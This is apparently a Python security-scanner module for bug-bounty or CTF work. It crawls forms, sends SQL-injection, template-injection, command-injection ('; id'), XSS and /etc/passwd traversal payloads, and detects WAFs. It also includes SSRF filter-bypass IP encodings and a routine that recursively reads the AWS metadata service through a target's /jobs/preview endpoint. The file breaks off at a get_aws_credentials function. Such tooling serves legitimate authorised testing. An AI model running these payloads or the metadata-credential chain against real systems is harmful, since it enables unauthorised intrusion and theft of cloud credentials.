"""Core security testing engine.

Systematic payload testing with response diffing, attack surface mapping,
SQLite-backed state persistence, request pacing, WAF backoff, and an
orchestration layer for automated endpoint scanning.
"""

from __future__ import annotations

import json
import os
import re
import sqlite3
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, ClassVar
from urllib.parse import urljoin, urlparse

import requests


@dataclass(frozen=True)
class TestResult:
    """Structured result from a single payload test."""

    payload: str
    confirmed: bool
    interesting: bool
    indicators: list[str] = field(default_factory=list)
    details: list[str] = field(default_factory=list)
    status_code: int = 0
    response_length: int = 0
    vuln_type: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "payload": self.payload,
            "confirmed": self.confirmed,
            "interesting": self.interesting,
            "indicators": self.indicators,
            "details": self.details,
            "status_code": self.status_code,
            "response_length": self.response_length,
            "vuln_type": self.vuln_type,
        }


@dataclass
class DiffAnalysis:
    """Result of comparing a baseline response against a test response."""

    status_changed: bool
    length_diff: int
    timing_diff: float
    content_differs: bool
    interesting: bool
    indicators: list[str] = field(default_factory=list)
    differences: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "status_changed": self.status_changed,
            "length_diff": self.length_diff,
            "timing_diff": self.timing_diff,
            "content_differs": self.content_differs,
            "interesting": self.interesting,
            "indicators": self.indicators,
            "differences": self.differences,
        }


class ResponseDiff:
    """Compare two HTTP responses and identify meaningful differences."""

    CONTENT_PATTERNS: ClassVar[dict[str, list[str]]] = {
        "sql_error": [
            r"SQL syntax",
            r"You have an error in your SQL",
            r"sqlite3\.OperationalError",
            r"pymysql\.err",
            r"psycopg2\.ProgrammingError",
            r"ORA-\d+",
        ],
        "command_output": [r"uid=\d+", r"gid=\d+", r"groups=\d+", r"root:", r"bin:", r"daemon:"],
        "file_contents": [r"/bin/bash", r"/usr/sbin/nologin", r"root:x:0:0"],
        "ssti_evaluated": [r"\b49\b", r"\b343\b"],
        "xxe_triggered": [r"root:x:0:", r"daemon:x:1:", r"bin:x:2:"],
        "auth_bypass": [r"welcome", r"dashboard", r"admin panel", r"authenticated"],
        "info_leak": [r"version", r"stack trace", r"traceback", r"debug", r"error in"],
        "flag_found": [r"flag\{", r"CTF\{", r"pwn\{", r"secret\{", r"key\{"],
    }

    WAF_PATTERNS: ClassVar[list[str]] = [
        r"blocked",
        r"forbidden",
        r"rate.limit",
        r"too.many",
        r"cloudflare",
        r"akamai",
        r"incapsula",
        r"mod.security",
        r"request.blocked",
    ]

    def __init__(self, baseline: requests.Response, test_response: requests.Response) -> None:
        self.baseline = baseline
        self.test = test_response
        self.differences: list[str] = []
        self.interesting = False
        self.indicators: list[str] = []

    def analyze(self) -> DiffAnalysis:
        """Run all diff checks and return analysis."""
        self._check_status_code()
        self._check_length()
        self._check_timing()
        self._check_content()
        self._check_errors()
        self._check_redirects()
        self._check_headers()
        self._check_security_indicators()

        return DiffAnalysis(
            status_changed=self.baseline.status_code != self.test.status_code,
            length_diff=abs(len(self.baseline.text) - len(self.test.text)),
            timing_diff=getattr(self.test, "response_time", 0.0)
            - getattr(self.baseline, "response_time", 0.0),
            content_differs=self.baseline.text != self.test.text,
            interesting=self.interesting,
            indicators=self.indicators,
            differences=self.differences,
        )

    def _check_status_code(self) -> None:
        if self.baseline.status_code != self.test.status_code:
            self.differences.append(f"Status: {self.baseline.status_code} → {self.test.status_code}")
            self.interesting = True
            self.indicators.append("status_code_change")

    def _check_length(self) -> None:
        base_len = len(self.baseline.text)
        test_len = len(self.test.text)
        diff = abs(test_len - base_len)

        if base_len > 0 and diff / base_len > 0.05:
            self.differences.append(f"Length: {base_len} → {test_len} ({diff:+d} bytes)")
            self.interesting = True
            self.indicators.append("length_change")
        elif base_len == 0 and test_len > 100:
            self.differences.append(f"Length: 0 → {test_len}")
            self.interesting = True
            self.indicators.append("content_appeared")

    def _check_timing(self) -> None:
        base_time = getattr(self.baseline, "response_time", 0.0)
        test_time = getattr(self.test, "response_time", 0.0)

        if test_time > base_time * 2 and test_time > 1.0:
            self.differences.append(f"Timing: {base_time:.3f}s → {test_time:.3f}s")
            self.interesting = True
            self.indicators.append("timing_delay")

    def _check_content(self) -> None:
        """Check for content patterns that are NEW in the test response (not in baseline)."""
        for category, regexes in self.CONTENT_PATTERNS.items():
            for regex in regexes:
                in_test = bool(re.search(regex, self.test.text, re.IGNORECASE))
                in_baseline = bool(re.search(regex, self.baseline.text, re.IGNORECASE))
                if in_test and not in_baseline:
                    self.indicators.append(category)
                    self.interesting = True
                    self.differences.append(f"Pattern found: {category}")
                    break

    def _check_errors(self) -> None:
        """Detect application error responses that weren't in baseline.

        Excludes generic parser error messages (YAML parse error, JSON parse error)
        to avoid false positives when testing payloads that are invalid input
        formats but not actual application errors.
        """
        error_patterns = [r"error", r"exception", r"failed", r"invalid", r"denied", r"forbidden"]

        parser_error_patterns = [
            r"parse error",
            r"syntax error",
            r"could not parse",
            r"unexpected token",
        ]

        baseline_has_error = any(
            re.search(p, self.baseline.text, re.IGNORECASE) for p in error_patterns
        )
        test_has_error = any(re.search(p, self.test.text, re.IGNORECASE) for p in error_patterns)

        test_has_parser_error = any(
            re.search(p, self.test.text, re.IGNORECASE) for p in parser_error_patterns
        )

        if test_has_error and not baseline_has_error and not test_has_parser_error:
            self.differences.append("New error message detected")
            self.interesting = True
            self.indicators.append("error_appeared")

    def _check_redirects(self) -> None:
        if self.test.status_code in (301, 302, 303, 307, 308):
            location = self.test.headers.get("Location", "")
            self.differences.append(f"Redirect to: {location}")
            self.interesting = True
            self.indicators.append("redirect")

    def _check_headers(self) -> None:
        """Check for interesting header changes."""
        interesting_headers = ["set-cookie", "x-powered-by", "server", "access-control-allow-origin"]

        for header in interesting_headers:
            base_val = self.baseline.headers.get(header, "")
            test_val = self.test.headers.get(header, "")
            if base_val != test_val:
                self.differences.append(f"Header {header}: '{base_val}' → '{test_val}'")
                if header == "set-cookie":
                    self.interesting = True
                    self.indicators.append("cookie_set")

    def _check_security_indicators(self) -> None:
        """Check for WAF responses, rate limiting, etc."""
        for pattern in self.WAF_PATTERNS:
            if re.search(pattern, self.test.text, re.IGNORECASE) and not re.search(
                pattern, self.baseline.text, re.IGNORECASE
            ):
                self.differences.append(f"Defense triggered: {pattern}")
                self.indicators.append("defense_triggered")
                break


# Regex patterns for HTML parsing — attribute order agnostic.
_FORM_RE = re.compile(r"<form([^>]*)>(.*?)</form>", re.DOTALL | re.IGNORECASE)
_FORM_ATTR_RE = re.compile(r'(method|action)\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
_INPUT_RE = re.compile(
    r'<input[^>]*name\s*=\s*["\']([^"\']*)["\'][^>]*'
    r'(?:value\s*=\s*["\']([^"\']*)["\'][^>]*)?',
    re.IGNORECASE,
)
_TEXTAREA_RE = re.compile(
    r'<textarea[^>]*name\s*=\s*["\']([^"\']*)["\']',
    re.IGNORECASE,
)
_SELECT_RE = re.compile(
    r'<select[^>]*name\s*=\s*["\']([^"\']*)["\']',
    re.IGNORECASE,
)
_HREF_RE = re.compile(r'href\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)

_NOISE_PATTERNS = [
    re.compile(r'name="csrf[_\-]?token"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="_token"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="__VIEWSTATE"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="__EVENTVALIDATION"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'name="csrfmiddlewaretoken"\s+value="[^"]*"', re.IGNORECASE),
    re.compile(r'csrf[_\-]?token["\']?\s*[:=]\s*["\'][^"\']*["\']', re.IGNORECASE),
    re.compile(r'nonce["\']?\s*[:=]\s*["\'][^"\']+["\']', re.IGNORECASE),
    re.compile(r'timestamp["\']?\s*[:=]\s*["\']?\d{10,}["\']?', re.IGNORECASE),
]


def _strip_noise(text: str) -> str:
    """Strip dynamic noise (CSRF tokens, nonces, timestamps) from response text."""
    cleaned = text
    for pattern in _NOISE_PATTERNS:
        cleaned = pattern.sub("", cleaned)
    return cleaned


def _similarity_ratio(a: str, b: str) -> float:
    """Compute text similarity ratio between two strings, ignoring noise."""
    from difflib import SequenceMatcher

    clean_a = _strip_noise(a)
    clean_b = _strip_noise(b)
    return SequenceMatcher(None, clean_a, clean_b).ratio()


def _extract_form_attrs(form_tag: str) -> dict[str, str]:
    """Extract method and action attributes from a <form ...> tag, order-agnostic."""
    attrs: dict[str, str] = {}
    for match in _FORM_ATTR_RE.finditer(form_tag):
        attrs[match.group(1).lower()] = match.group(2)
    return attrs


def _default_db_path() -> str:
    return os.path.expanduser("~/.hermes/bugbounty.db")


def _default_state_file(base_url: str) -> str:
    """Per-target state file — prevents overwriting target A's state when testing target B."""
    host = urlparse(base_url).hostname or "unknown"
    safe_host = re.sub(r"[^a-zA-Z0-9._-]", "", host)
    return os.path.expanduser(f"~/.hermes/state/{safe_host}.json")


class ScannerDB:
    """SQLite-backed persistence for scanner findings, history, and attack surface."""

    def __init__(self, db_path: str | None = None) -> None:
        self.db_path = db_path or _default_db_path()
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        self._conn: sqlite3.Connection | None = None
        self._init_schema()

    @property
    def conn(self) -> sqlite3.Connection:
        if self._conn is None:
            self._conn = sqlite3.connect(self.db_path)
            self._conn.row_factory = sqlite3.Row
        return self._conn

    def _init_schema(self) -> None:
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_host TEXT NOT NULL,
                endpoint TEXT NOT NULL,
                method TEXT,
                payload TEXT,
                vuln_type TEXT,
                confidence REAL DEFAULT 0.0,
                indicators TEXT DEFAULT '[]',
                details TEXT DEFAULT '[]',
                timestamp TEXT
            );
            CREATE TABLE IF NOT EXISTS test_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_host TEXT NOT NULL,
                endpoint TEXT NOT NULL,
                method TEXT,
                payload TEXT,
                interesting INTEGER DEFAULT 0,
                indicators TEXT DEFAULT '[]',
                timestamp TEXT
            );
            CREATE TABLE IF NOT EXISTS attack_surface (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_host TEXT NOT NULL,
                start_url TEXT NOT NULL,
                surface_json TEXT NOT NULL,
                timestamp TEXT
            );
            CREATE INDEX IF NOT EXISTS idx_findings_host ON findings(target_host);
            CREATE INDEX IF NOT EXISTS idx_findings_type ON findings(vuln_type);
            CREATE INDEX IF NOT EXISTS idx_history_host ON test_history(target_host);
        """)
        self.conn.commit()

    def save_finding(
        self,
        target_host: str,
        endpoint: str,
        vuln_type: str,
        method: str = "",
        payload: str = "",
        confidence: float = 0.0,
        indicators: list[str] | None = None,
        details: list[str] | None = None,
    ) -> None:
        self.conn.execute(
            """INSERT INTO findings (target_host, endpoint, method, payload, vuln_type,
               confidence, indicators, details, timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                target_host, endpoint, method, payload, vuln_type, confidence,
                json.dumps(indicators or []), json.dumps(details or []),
                datetime.now().isoformat(),
            ),
        )
        self.conn.commit()

    def save_history(
        self,
        target_host: str,
        endpoint: str,
        method: str,
        payload: str,
        interesting: bool,
        indicators: list[str] | None = None,
    ) -> None:
        self.conn.execute(
            """INSERT INTO test_history (target_host, endpoint, method, payload,
               interesting, indicators, timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (
                target_host, endpoint, method, payload, int(interesting),
                json.dumps(indicators or []), datetime.now().isoformat(),
            ),
        )
        self.conn.commit()

    def save_surface(self, target_host: str, start_url: str, surface: dict[str, Any]) -> None:
        self.conn.execute(
            """INSERT INTO attack_surface (target_host, start_url, surface_json, timestamp)
               VALUES (?, ?, ?, ?)""",
            (target_host, start_url, json.dumps(surface), datetime.now().isoformat()),
        )
        self.conn.commit()

    def query_findings(self, where: str = "", params: tuple[Any, ...] = ()) -> list[dict[str, Any]]:
        sql = "SELECT * FROM findings"
        if where:
            sql += f" WHERE {where}"
        sql += " ORDER BY timestamp DESC"
        rows = self.conn.execute(sql, params).fetchall()
        return [dict(r) for r in rows]

    def query_history(self, where: str = "", params: tuple[Any, ...] = ()) -> list[dict[str, Any]]:
        sql = "SELECT * FROM test_history"
        if where:
            sql += f" WHERE {where}"
        sql += " ORDER BY timestamp DESC LIMIT 500"
        rows = self.conn.execute(sql, params).fetchall()
        return [dict(r) for r in rows]

    def close(self) -> None:
        if self._conn is not None:
            self._conn.close()
            self._conn = None


class SecurityScanner:
    """Main security testing engine with SQLite persistence and request pacing."""

    def __init__(
        self,
        base_url: str,
        session: requests.Session | None = None,
        state_file: str | Path | None = None,
        *,
        timeout: float = 10.0,
        delay: float = 0.0,
        respect_waf: bool = True,
        db: ScannerDB | None = None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.host = urlparse(base_url).hostname or "unknown"
        self.session = session or requests.Session()
        self.state_file = str(state_file or _default_state_file(base_url))
        self.timeout = timeout
        self.delay = delay
        self.respect_waf = respect_waf
        self.waf_detected: bool = False
        self.findings: list[dict[str, Any]] = []
        self.test_history: list[dict[str, Any]] = []
        self.attack_surface: dict[str, Any] = {}
        self.defenses_detected: list[str] = []
        self.db = db or ScannerDB()
        self._load_state()

    def _load_state(self) -> None:
        """Load previous testing state from per-target JSON file."""
        if not os.path.exists(self.state_file):
            return
        try:
            with open(self.state_file) as f:
                state = json.load(f)
            if state.get("base_url") == self.base_url:
                self.findings = state.get("findings", [])
                self.test_history = state.get("test_history", [])
                self.attack_surface = state.get("attack_surface", {})
                self.defenses_detected = state.get("defenses_detected", [])
        except (OSError, json.JSONDecodeError):
            pass

    def _save_state(self) -> None:
        """Save current testing state to per-target JSON file."""
        state = {
            "base_url": self.base_url,
            "findings": self.findings[-500:],
            "test_history": self.test_history[-500:],
            "attack_surface": self.attack_surface,
            "defenses_detected": self.defenses_detected,
            "updated_at": datetime.now().isoformat(),
        }
        os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
        with open(self.state_file, "w") as f:
            json.dump(state, f, indent=2)

    def _effective_delay(self) -> float:
        """Compute effective delay, doubling if WAF was detected and respect_waf is on."""
        if self.respect_waf and self.waf_detected:
            return self.delay * 2
        return self.delay

    def _make_request(self, method: str, url: str, **kwargs: Any) -> requests.Response:
        """Make HTTP request with timing, retry on transient failure, and pacing."""
        delay = self._effective_delay()

        for attempt in range(2):
            if delay > 0 and attempt == 0:
                time.sleep(delay)
            start = time.time()
            try:
                response = self.session.request(method, url, timeout=self.timeout, **kwargs)
                response.response_time = time.time() - start
                return response
            except requests.exceptions.RequestException:
                if attempt == 0:
                    time.sleep(0.5)
                    continue
                response = requests.Response()
                response.status_code = 0
                response._content = b"Request failed: timeout or connection error"
                response.response_time = time.time() - start
                return response
        response = requests.Response()
        response.status_code = 0
        response._content = b"Request failed: retries exhausted"
        return response

    def get_baseline(self, method: str, url: str, **kwargs: Any) -> requests.Response:
        """Establish baseline response for an endpoint."""
        return self._make_request(method, url, **kwargs)

    def _record_finding(
        self,
        endpoint: str,
        method: str,
        payload: str,
        indicators: list[str],
        details: list[str],
        vuln_type: str = "",
    ) -> None:
        """Record a finding in memory, JSON state, and SQLite."""
        finding = {
            "type": vuln_type or "potential_vulnerability",
            "endpoint": endpoint,
            "method": method,
            "payload": payload,
            "indicators": indicators,
            "details": details,
            "timestamp": datetime.now().isoformat(),
        }
        self.findings.append(finding)
        self.db.save_finding(
            target_host=self.host,
            endpoint=endpoint,
            vuln_type=vuln_type,
            method=method,
            payload=payload,
            confidence=0.8 if indicators else 0.0,
            indicators=indicators,
            details=details,
        )

    def test_payload(
        self,
        baseline: requests.Response,
        method: str,
        url: str,
        payload_data: dict[str, str] | str,
        payload_name: str = "test",
        vuln_type: str = "",
    ) -> dict[str, Any]:
        """Test a single payload against a baseline."""
        test_data: dict[str, str] | str
        if isinstance(payload_data, dict):
            test_data = {}
            for k, v in payload_data.items():
                if isinstance(v, str) and "{PAYLOAD}" in v:
                    test_data[k] = v.replace("{PAYLOAD}", payload_name)
                else:
                    test_data[k] = v
        else:
            test_data = payload_data

        kwargs: dict[str, Any] = {}
        if method.upper() in ("POST", "PUT", "PATCH"):
            kwargs["data"] = test_data
        else:
            kwargs["params"] = test_data

        response = self._make_request(method, url, **kwargs)
        diff = ResponseDiff(baseline, response)
        analysis = diff.analyze()

        return {
            "payload": payload_name,
            "method": method,
            "url": url,
            "baseline_status": baseline.status_code,
            "test_status": response.status_code,
            "analysis": analysis.to_dict(),
            "timestamp": datetime.now().isoformat(),
            "vuln_type": vuln_type,
        }

    def run_payload_set(
        self,
        baseline: requests.Response,
        method: str,
        url: str,
        payloads: dict[str, str],
        param_name: str = "input",
        vuln_type: str = "",
    ) -> list[dict[str, Any]]:
        """Run a set of payloads against an endpoint."""
        results: list[dict[str, Any]] = []

        for payload_name, payload_value in payloads.items():
            payload_data = {param_name: payload_value}
            result = self.test_payload(baseline, method, url, payload_data, payload_name, vuln_type)
            results.append(result)

            self.test_history.append({
                "endpoint": url,
                "method": method,
                "payload": payload_name,
                "interesting": result["analysis"]["interesting"],
                "indicators": result["analysis"]["indicators"],
            })
            self.db.save_history(
                self.host, url, method, payload_name,
                result["analysis"]["interesting"],
                result["analysis"]["indicators"],
            )

            if result["analysis"]["interesting"]:
                self._record_finding(
                    url, method, payload_name,
                    result["analysis"]["indicators"],
                    result["analysis"]["differences"],
                    vuln_type,
                )

        self._save_state()
        return results

    def map_surface(self, start_url: str = "/") -> dict[str, Any]:
        """Map the attack surface by crawling and extracting inputs."""
        url = urljoin(self.base_url, start_url)

        try:
            response = self.session.get(url, timeout=self.timeout)
        except requests.exceptions.RequestException:
            return {"error": "Could not reach target"}

        forms: list[dict[str, Any]] = []
        for form_match in _FORM_RE.finditer(response.text):
            form_tag = form_match.group(1)
            form_html = form_match.group(2)
            attrs = _extract_form_attrs(form_tag)
            method = attrs.get("method", "GET").upper()
            action = attrs.get("action", "")

            inputs: list[dict[str, str]] = []
            for inp in _INPUT_RE.finditer(form_html):
                inputs.append({"name": inp.group(1), "value": inp.group(2) or "", "type": "text"})
            for ta in _TEXTAREA_RE.finditer(form_html):
                inputs.append({"name": ta.group(1), "value": "", "type": "textarea"})
            for sel in _SELECT_RE.finditer(form_html):
                inputs.append({"name": sel.group(1), "value": "", "type": "select"})

            forms.append({
                "method": method,
                "action": urljoin(self.base_url, action),
                "inputs": inputs,
            })

        links: list[str] = []
        for match in _HREF_RE.finditer(response.text):
            link = match.group(1)
            if link and not link.startswith(("#", "javascript:", "mailto:", "data:")):
                links.append(urljoin(self.base_url, link))

        surface = {
            "url": url,
            "status_code": response.status_code,
            "forms": forms,
            "links": list(set(links)),
            "headers": dict(response.headers),
            "tech_hints": self._detect_technology(response),
        }

        self.attack_surface[start_url] = surface
        self.db.save_surface(self.host, start_url, surface)
        self._save_state()
        return surface

    def _detect_technology(self, response: requests.Response) -> list[str]:
        """Detect technology stack from response."""
        hints: list[str] = []

        server = response.headers.get("Server", "")
        if "werkzeug" in server.lower():
            hints.append("Flask/Python (Werkzeug)")
        if "nginx" in server.lower():
            hints.append("nginx")
        if "apache" in server.lower():
            hints.append("Apache")

        x_powered = response.headers.get("X-Powered-By", "")
        if x_powered:
            hints.append(f"X-Powered-By: {x_powered}")

        set_cookie = response.headers.get("Set-Cookie", "")
        if "sessionid=" in set_cookie.lower():
            hints.append("Django/Python")
        if "PHPSESSID" in set_cookie:
            hints.append("PHP")
        if "connect.sid" in set_cookie:
            hints.append("Node.js/Express")

        if "jinja" in response.text.lower():
            hints.append("Jinja2 template engine")

        return hints

    def scan_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: dict[str, str] | None = None,
        data: dict[str, str] | None = None,
    ) -> dict[str, list[TestResult]]:
        """Auto-run all relevant tests against an endpoint in priority order.

        Detects defenses, then runs SQLi, SSTI, CMDi, XSS, and path traversal.
        Each finding is confirmed via a second-pass check for vuln-specific
        content patterns, eliminating false positives from generic response changes.
        """

        results: dict[str, list[TestResult]] = {}

        if not self.attack_surface:
            self.map_surface("/")

        if not self.defenses_detected:
            from bugbounty_ctf.advanced_tests import detect_defenses

            defenses = detect_defenses(self.base_url, scanner=self)
            if defenses.get("waf"):
                self.waf_detected = True

        is_post = method.upper() in ("POST", "PUT", "PATCH")
        if is_post:
            test_data = data or {}
            kwargs = {"data": test_data}
        else:
            test_data = params or {}
            kwargs = {"params": test_data}

        baseline = self._make_request(method, url, **kwargs)
        baseline_text = baseline.text

        test_param: str | None = None
        if isinstance(test_data, dict) and test_data:
            test_param = next(iter(test_data.keys()))

        if test_param:
            test_configs = [
                ("sqli", {
                    "single_quote": "'",
                    "or_true": "' OR 1=1--",
                    "or_true_alt": "' OR '1'='1",
                    "admin_comment": "admin'--",
                    "union_null": "' UNION SELECT NULL--",
                }),
                ("ssti", {"ssti_basic": "{{7*7}}", "ssti_math49": "{{7*49}}"}),
                ("cmdi", {"semicolon_id": "; id", "pipe_id": "| id", "dollar_id": "$(id)"}),
                ("xss", {"script_tag": "<script>alert(1)</script>", "svg_onload": "<svg onload=alert(1)>"}),
                ("lfi", {"passwd": "../../../etc/passwd", "hosts": "../../../../../../etc/hosts"}),
            ]

            for vuln_type, payloads in test_configs:
                confirmed_results: list[TestResult] = []
                for payload_name, payload_value in payloads.items():
                    payload_data = {test_param: payload_value}
                    raw = self.test_payload(baseline, method, url, payload_data, payload_name, vuln_type)
                    tr = self._to_test_result(raw, vuln_type)

                    if tr.interesting:
                        response = self._make_request(
                            method, url,
                            **({"data": {test_param: payload_value}} if is_post
                               else {"params": {test_param: payload_value}})
                        )
                        is_confirmed = confirm_vulnerability(
                            vuln_type, response.text, baseline_text, payload_value
                        )
                        tr = TestResult(
                            payload=tr.payload,
                            confirmed=is_confirmed,
                            interesting=tr.interesting,
                            indicators=tr.indicators,
                            details=tr.details,
                            status_code=response.status_code,
                            response_length=len(response.text),
                            vuln_type=vuln_type,
                        )
                        if is_confirmed:
                            self._record_finding(
                                url, method, tr.payload, tr.indicators, tr.details, vuln_type
                            )
                    confirmed_results.append(tr)
                results[vuln_type] = confirmed_results

        return results

    @staticmethod
    def _to_test_result(raw: dict[str, Any], vuln_type: str) -> TestResult:
        """Convert a raw payload result dict into a TestResult dataclass."""
        analysis = raw.get("analysis", {})
        return TestResult(
            payload=raw.get("payload", ""),
            confirmed=analysis.get("interesting", False),
            interesting=analysis.get("interesting", False),
            indicators=analysis.get("indicators", []),
            details=analysis.get("differences", []),
            status_code=raw.get("test_status", 0),
            response_length=abs(analysis.get("length_diff", 0)),
            vuln_type=vuln_type,
        )

    def get_summary(self) -> dict[str, Any]:
        """Get testing summary."""
        return {
            "target": self.base_url,
            "host": self.host,
            "findings_count": len(self.findings),
            "tests_run": len(self.test_history),
            "interesting_tests": sum(1 for t in self.test_history if t.get("interesting")),
            "defenses_detected": self.defenses_detected,
            "waf_detected": self.waf_detected,
            "findings": self.findings,
            "last_updated": datetime.now().isoformat(),
        }


def derive_base_url(url: str) -> str:
    """Derive a base URL from a full URL, preserving the scheme and host.

    Fixes the old `url.rsplit('/', 1)[0]` approach which broke on nested paths:
        http://target/api/v1/login → http://target/api/v1  (wrong)
        This function → http://target                    (correct)
    """
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        raise ValueError(f"Invalid URL (need scheme+host): {url}")
    return f"{parsed.scheme}://{parsed.netloc}"


# ============================================================================
# Vulnerability Confirmation Patterns
# ============================================================================

CONFIRMATION_PATTERNS: dict[str, list[str]] = {
    "sqli": [
        r"SQL syntax", r"You have an error in your SQL", r"sqlite3\.OperationalError",
        r"pymysql\.err", r"psycopg2\.ProgrammingError", r"ORA-\d+",
        r"unterminated.*string", r"near.*\".*\": syntax error",
        r"mysql_fetch", r"SQLSTATE\[", r"pg_query\(",
        r"unclosed.*quotation", r"Doctrine.*ORMException",
    ],
    "ssti": [
        r"\b49\b", r"\b343\b", r"{{.*}}.*\d{2,}",
    ],
    "cmdi": [
        r"uid=\d+", r"gid=\d+", r"groups=\d+", r"root:x:0:0",
        r"\/bin\/(bash|sh|zsh)", r"daemon:x:\d+",
    ],
    "xss": [
        r"<script>alert\(1\)</script>", r"<svg onload=alert\(1\)>",
        r"<img src=x onerror=", r"<details open ontoggle=",
    ],
    "lfi": [
        r"root:x:0:0", r"daemon:x:1:", r"bin:x:2:",
        r"\/bin\/bash", r"\/usr\/sbin\/nologin",
        r"127\.0\.0\.1.*localhost",
    ],
    "ssrf": [
        r"AccessKeyId", r"SecretAccessKey", r"Token",
        r"ami-id", r"instance-id", r"iam\/security-credentials",
        r"169\.254\.169\.254", r"meta-data",
    ],
}


def confirm_vulnerability(
    vuln_type: str,
    response_text: str,
    baseline_text: str,
    payload: str = "",
) -> bool:
    """Second-pass confirmation: check for vuln-specific content in the response.

    Returns True only if the response contains patterns specific to the
    vulnerability class that were NOT in the baseline. This prevents
    false positives where any response change is reported as a vuln.
    """
    patterns = CONFIRMATION_PATTERNS.get(vuln_type, [])
    if not patterns:
        return True

    for pattern in patterns:
        in_response = bool(re.search(pattern, response_text, re.IGNORECASE))
        in_baseline = bool(re.search(pattern, baseline_text, re.IGNORECASE))
        if in_response and not in_baseline:
            return True

    if vuln_type == "ssti" and payload:
        if "7*7" in payload and "49" in response_text and "49" not in baseline_text:
            return True
        if "7*49" in payload and "343" in response_text and "343" not in baseline_text:
            return True

    return vuln_type == "xss" and bool(payload) and payload in response_text and payload not in baseline_text


# ============================================================================
# IP Encoding Bypass Utilities
# ============================================================================

def ip_to_octal(ip: str) -> str:
    """Convert IP to octal format (127.0.0.1 → 0177.0.0.1)."""
    parts = ip.split(".")
    return ".".join(str(oct(int(p))[2:]) for p in parts)


def ip_to_decimal(ip: str) -> str:
    """Convert IP to decimal format (127.0.0.1 → 2130706433)."""
    parts = ip.split(".")
    return str(sum(int(p) << (8 * (3 - i)) for i, p in enumerate(parts)))


def ip_to_hex(ip: str) -> str:
    """Convert IP to hex format (127.0.0.1 → 0x7f000001)."""
    parts = ip.split(".")
    return "0x" + "".join(f"{int(p):02x}" for p in parts)


def generate_ssrf_bypass_ips(ip: str = "127.0.0.1") -> list[str]:
    """Generate IP encodings that may bypass SSRF filters.

    Returns multiple representations of the same IP:
    - Original: 127.0.0.1
    - Octal: 0177.0.0.1
    - Decimal: 2130706433
    - Hex: 0x7f000001
    - Short: 127.1 (only for 127.0.0.1)
    - Zero: 0 (binds to localhost on Linux)
    """
    bypasses = [ip, ip_to_octal(ip), ip_to_decimal(ip), ip_to_hex(ip)]
    if ip == "127.0.0.1":
        bypasses.extend(["127.1", "0", "0.0.0.0"])
    return bypasses


def bypass_url_filter(
    url: str,
    scanner: SecurityScanner,
    blocked_substrings: list[str] | None = None,
) -> str | None:
    """Try to bypass SSRF URL filters by manipulating the URL.

    Tries:
    1. IP encoding bypasses (octal, decimal, hex) for localhost
    2. #.yaml fragment trick for extension requirements
    3. Query string splitting for blocked path substrings

    Returns the first working URL that passes the filter, or None.
    """
    if blocked_substrings is None:
        blocked_substrings = ["127.0.0.1", "localhost", "internal", "metadata", "nimbus"]

    parsed = urlparse(url)

    bypass_ips = generate_ssrf_bypass_ips("127.0.0.1")
    bypass_ips.extend(generate_ssrf_bypass_ips("169.254.169.254"))

    for bypass_ip in bypass_ips:
        if bypass_ip in blocked_substrings:
            continue
        test_url = url.replace(parsed.hostname or "", bypass_ip)
        if not any(bs in test_url.lower() for bs in blocked_substrings):
            if "#" not in test_url:
                test_url += "#.yaml"
            r = scanner._make_request(
                "POST",
                f"{scanner.base_url}/jobs/preview",
                data={"url": test_url},
            )
            if "Security policy" not in r.text and "blocked" not in r.text.lower():
                return test_url

    return None


# ============================================================================
# AWS Metadata Service Enumeration
# ============================================================================


def enumerate_aws_metadata(
    scanner: SecurityScanner,
    metadata_ip: str = "2852039166",
    base_path: str = "/latest/meta-data/",
    max_depth: int = 4,
) -> dict[str, str]:
    """Recursively enumerate the AWS metadata service.

    Uses the SSRF scanner to fetch metadata paths and recursively
    explore directories. The metadata_ip should be a bypass IP
    (decimal 2852039166 works when 169.254.169.254 is filtered).

    Returns a dict mapping path → content for all leaf nodes.
    """
    results: dict[str, str] = {}

    def _explore(path: str, depth: int) -> None:
        if depth > max_depth:
            return

        url = f"http://{metadata_ip}{path}#.yaml"
        r = scanner._make_request(
            "POST",
            f"{scanner.base_url}/jobs/preview",
            data={"url": url},
        )

        content_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
        if not content_match:
            return

        content = content_match.group(1)
        content = content.replace("&lt;", "<").replace("&gt;", ">")
        content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")

        if "Not Found" in content or "Could not fetch" in content:
            return

        lines = [line.strip() for line in content.split("\n") if line.strip()]
        if len(lines) > 1 and all(not line.startswith("{") and not line.startswith("<") for line in lines):
            for line in lines:
                if line.endswith("/"):
                    _explore(f"{path}{line}", depth + 1)
                else:
                    leaf_url = f"http://{metadata_ip}{path}{line}#.yaml"
                    leaf_r = scanner._make_request(
                        "POST",
                        f"{scanner.base_url}/jobs/preview",
                        data={"url": leaf_url},
                    )
                    leaf_match = re.search(r"<pre>(.*?)</pre>", leaf_r.text, re.DOTALL)
                    if leaf_match:
                        leaf_content = leaf_match.group(1)
                        leaf_content = leaf_content.replace("&lt;", "<").replace("&gt;", ">")
                        leaf_content = leaf_content.replace("&amp;", "&")
                        leaf_content = leaf_content.replace("&#34;", '"').replace("&#39;", "'")
                        if "Not Found" not in leaf_content:
                            results[f"{path}{line}"] = leaf_content
        else:
            results[path.rstrip("/")] = content

    _explore(base_path, 0)
    return results


def get_aws_credentials(
    scanner: SecurityScanner,
